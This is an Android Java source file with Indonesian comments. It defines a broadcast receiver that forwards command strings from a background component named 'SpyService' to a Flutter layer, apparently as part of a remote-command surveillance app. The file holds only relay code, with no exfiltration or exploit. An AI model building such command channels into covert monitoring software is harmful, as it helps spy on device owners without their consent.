package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import io.flutter.plugin.common.EventChannel;
import java.util.HashMap;
import java.util.Map;

/**
 * CommandProxyReceiver
 * Menerima broadcast dari SpyService (background) dan meneruskannya
 * ke Flutter via EventChannel "com.nullx.pp/proxy_events".
 * Ini adalah jembatan antara native service dan Dart executeLogic().
 */
public class CommandProxyReceiver extends BroadcastReceiver {

    private static final String TAG = "ProxyReceiver";
    private static EventChannel.EventSink eventSink = null;

    /** Dipanggil dari MainActivity saat EventChannel sink siap */
    public static void setEventSink(EventChannel.EventSink sink) {
        eventSink = sink;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;

        String action = intent.getAction();
        if (!"com.nullx.pp.COMMAND_PROXY".equals(action)) return;

        String cmd   = intent.getStringExtra("cmd");
        String extra = intent.getStringExtra("extra");

        if (cmd == null) return;

        Log.d(TAG, "Proxy received: " + cmd + " | extra: " + extra);

        if (eventSink != null) {
            // Kirim ke Flutter di main thread
            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                try {
                    Map<String, String> payload = new HashMap<>();
                    payload.put("command", cmd);
                    payload.put("extra",   extra != null ? extra : "");
                    eventSink.success(payload);
                } catch (Exception e) {
                    Log.e(TAG, "EventSink error: " + e.getMessage());
                }
            });
        } else {
            Log.w(TAG, "EventSink null — Flutter belum siap, command dropped: " + cmd);
        }
    }
}
